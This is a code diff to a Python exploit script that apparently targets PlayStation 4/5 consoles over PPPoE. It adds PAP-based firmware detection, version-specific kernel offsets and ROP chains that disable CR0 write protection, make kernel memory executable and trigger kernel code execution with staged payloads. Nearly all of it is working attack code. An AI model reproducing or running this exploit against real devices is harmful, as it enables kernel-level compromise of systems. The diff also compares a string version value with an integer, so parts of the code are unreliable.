@@ -147,6 +147,30 @@ class LcpEchoHandler(AsyncSniffer):
             / PPPoE(sessionid=pkt[PPPoE].sessionid) / PPP() /
             PPP_LCP_Echo(code=ECHO_REPLY, id=pkt[PPP_LCP_Echo].id))
 
+def parse_pap(username, pwd, key):
+    if key == "sys_ver":
+        return pwd
+
+def getOffsets(sys_ver):
+    if sys_ver in ('750', '751', '755'):
+        return OffsetsFirmware_750_755()
+    elif sys_ver in ('800', '801', '803'):
+        return OffsetsFirmware_800_803()
+    elif sys_ver in ('850', '852'):
+        return OffsetsFirmware_850_852()
+    elif sys_ver == '900':
+        return OffsetsFirmware_900()
+    elif sys_ver in ('903', '904'):
+        return OffsetsFirmware_903_904()
+    elif sys_ver in ('950', '951', '960'):
+        return OffsetsFirmware_950_960()
+    elif sys_ver in ('1000', '1001'):
+        return OffsetsFirmware_1000_1001()
+    elif sys_ver in ('1050', '1070', '1071'):
+        return OffsetsFirmware_1050_1071()
+    elif sys_ver == '1100':
+        return OffsetsFirmware_1100()
+    return None
 
 class Exploit():
     SPRAY_NUM = 0x1000
@@ -171,8 +195,9 @@ class Exploit():
 
     BPF_FILTER = '(ip6) || (pppoed) || (pppoes && !ip)'
 
-    def __init__(self, offs, iface, stage1, stage2):
-        self.offs = offs
+    def __init__(self, sys_ver, iface, stage1, stage2):
+        self.offs = None
+        self.sys_ver = sys_ver
         self.iface = iface
         self.stage1 = stage1
         self.stage2 = stage2
@@ -181,13 +206,94 @@ class Exploit():
     def kdlsym(self, addr):
         return self.kaslr_offset + addr
 
+    def lcp_negotiation_with_pap(self):
+        print('[*] Sending LCP configure request...')
+        self.s.send(
+            Ether(src=self.source_mac,
+                  dst=self.target_mac,
+                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
+            PPP() / PPP_LCP_Configure(code=CONF_REQ, id=self.LCP_ID, options=PPP_LCP_Auth_Protocol_Option()))
+
+        print('[*] Waiting for LCP configure ACK...')
+        while True:
+            pkt = self.s.recv()
+            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
+                    PPP_LCP_Configure].code == CONF_ACK:
+                break
+
+        print('[*] Waiting for LCP configure request...')
+        while True:
+            pkt = self.s.recv()
+            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
+                    PPP_LCP_Configure].code == CONF_REQ:
+                break
+
+        print('[*] Sending LCP configure ACK...')
+        self.s.send(
+            Ether(src=self.source_mac,
+                  dst=self.target_mac,
+                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
+            PPP() / PPP_LCP(code=CONF_ACK, id=pkt[PPP_LCP_Configure].id))
+
+        print('[*] Waiting for PAP authentication request...')
+        while True:
+            pkt = self.s.recv()
+            if pkt and pkt.haslayer(PPP_PAP_Request):
+                if pkt[PPP_PAP_Request].username_len != 0:
+                    username = pkt[PPP_PAP_Request].username.decode("ascii")
+                    print("[+] PAP username:", username)
+                if pkt[PPP_PAP_Request].passwd_len != 0:
+                    pwd = pkt[PPP_PAP_Request].password.decode("ascii")
+                    print("[+] PAP password:", pwd)
+                    sys_ver = parse_pap(username, pwd, "sys_ver")
+                    self.offs = getOffsets(sys_ver)
+                    if self.offs != None:
+                        self.sys_ver = sys_ver
+                    else:
+                        print("[-] Unknown System Software version specified on PS4/PS5.")
+                break
+        
+        if self.offs == None and self.sys_ver != None:
+            self.offs = getOffsets(self.sys_ver)
+            if self.offs == None:
+                self.sys_ver = None
+                print("[-] Unknown System Software version selected on host.")
+        
+        if self.offs == None:
+            print("[*] Propagating PPPoE username/password error to PS4/PS5...")
+            
+            print('[*] Sending PAP authentication NAK...')
+            self.s.send(
+                Ether(
+                    src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
+                / PPPoE(sessionid=self.SESSION_ID) /
+                PPP() / PPP_PAP_Response(code=3, id=pkt[PPP_PAP_Request].id))
+            
+            print('[*] Sending LCP terminate request...')
+            self.s.send(
+                Ether(
+                    src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
+                / PPPoE(sessionid=self.SESSION_ID) / PPP() / PPP_LCP_Terminate())
+                
+            print("[-] Exiting...")
+            exit(1)
+        
+        print("[+] Selected System Software version:", self.sys_ver)
+
+        print('[*] Sending PAP authentication ACK...')
+        self.s.send(
+            Ether(src=self.source_mac,
+                  dst=self.target_mac,
+                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
+            PPP() / PPP_PAP_Response(code=2, id=pkt[PPP_PAP_Request].id))
+
     def lcp_negotiation(self):
         print('[*] Sending LCP configure request...')
         self.s.send(
             Ether(src=self.source_mac,
                   dst=self.target_mac,
                   type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
-            PPP() / PPP_LCP(code=CONF_REQ, id=self.LCP_ID))
+            PPP() / PPP_LCP_Configure(code=CONF_REQ, id=self.LCP_ID))
 
         print('[*] Waiting for LCP configure ACK...')
         while True:
@@ -259,7 +365,7 @@ class Exploit():
                              id=pkt[PPP_IPCP].id,
                              options=pkt[PPP_IPCP].options))
 
-    def ppp_negotation(self, cb=None, ignore_initial_req=False):
+    def ppp_negotiation(self, cb=None, ignore_initial_req=False):
         if ignore_initial_req:
             print('[*] Waiting for PADI...')
             while True:
@@ -522,24 +628,28 @@ class Exploit():
     def build_second_rop(self):
         rop = bytearray()
 
-        # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
-        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
-        rop += p64(IDT_UD)
-        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
-        rop += p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET))
-        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
-        rop += p64(SDT_SYSIGT)
-        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-        rop += p64(SEL_KPL)
-        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
-        rop += p64(0)
-        rop += p64(0xDEADBEEF)
-        rop += p64(self.kdlsym(self.offs.SETIDT))
+        if (self.sys_ver >= 650):
+            # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
+            rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
+            rop += p64(IDT_UD)
+            rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
+            rop += p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET))
+            rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
+            rop += p64(SDT_SYSIGT)
+            rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
+            rop += p64(SEL_KPL)
+            rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
+            rop += p64(0)
+            rop += p64(0xDEADBEEF)
+            rop += p64(self.kdlsym(self.offs.SETIDT))
 
         # Disable write protection
         rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
         rop += p64(CR0_ORI & ~CR0_WP)
-        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        if (self.sys_ver >= 650):
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        else:
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_MOV_EAX_1_RET))
 
         # Enable RWX in kmem_alloc
         rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
@@ -554,7 +664,10 @@ class Exploit():
         # Restore write protection
         rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
         rop += p64(CR0_ORI)
-        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        if (self.sys_ver >= 650):
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        else:
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_MOV_EAX_1_RET))
 
         # kmem_alloc(*kernel_map, PAGE_SIZE)
 
@@ -617,8 +730,8 @@ class Exploit():
         print('')
         print('[+] STAGE 0: Initialization')
 
-        self.ppp_negotation(self.build_fake_ifnet, True)
-        self.lcp_negotiation()
+        self.ppp_negotiation(self.build_fake_ifnet, True)
+        self.lcp_negotiation_with_pap()
         self.ipcp_negotiation()
 
         print('[*] Waiting for interface to be ready...')
@@ -782,7 +895,7 @@ class Exploit():
                 src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
             / PPPoE(sessionid=self.SESSION_ID) / PPP() / PPP_LCP_Terminate())
 
-        self.ppp_negotation(self.build_fake_lle)
+        self.ppp_negotiation(self.build_fake_lle)
 
         print('[*] Triggering code execution...')
         self.s.send(
@@ -805,7 +918,7 @@ class Exploit():
                   type=ETHERTYPE_PPPOEDISC) /
             PPPoED(code=PPPOE_CODE_PADT, sessionid=self.SESSION_ID))
 
-        self.ppp_negotation()
+        self.ppp_negotiation()
         self.lcp_negotiation()
         self.ipcp_negotiation()
 
@@ -834,7 +947,7 @@ def main():
                             '1000', '1001', '1050', '1070', '1071',
                             '1100'
                         ],
-                        default='1100')
+                        default=None)
     parser.add_argument('--stage1', default='stage1/stage1.bin')
     parser.add_argument('--stage2', default='stage2/stage2.bin')
     args = parser.parse_args()
@@ -848,26 +961,7 @@ def main():
     with open(args.stage2, mode='rb') as f:
         stage2 = f.read()
 
-    if args.fw in ('750', '751', '755'):
-        offs = OffsetsFirmware_750_755()
-    elif args.fw in ('800', '801', '803'):
-        offs = OffsetsFirmware_800_803()
-    elif args.fw in ('850', '852'):
-        offs = OffsetsFirmware_850_852()
-    elif args.fw == '900':
-        offs = OffsetsFirmware_900()
-    elif args.fw in ('903', '904'):
-        offs = OffsetsFirmware_903_904()
-    elif args.fw in ('950', '951', '960'):
-        offs = OffsetsFirmware_950_960()
-    elif args.fw in ('1000', '1001'):
-        offs = OffsetsFirmware_1000_1001()
-    elif args.fw in ('1050', '1070', '1071'):
-        offs = OffsetsFirmware_1050_1071()
-    elif args.fw == '1100':
-        offs = OffsetsFirmware_1100()
-
-    exploit = Exploit(offs, args.interface, stage1, stage2)
+    exploit = Exploit(args.fw, args.interface, stage1, stage2)
     exploit.run()
 
     return 0
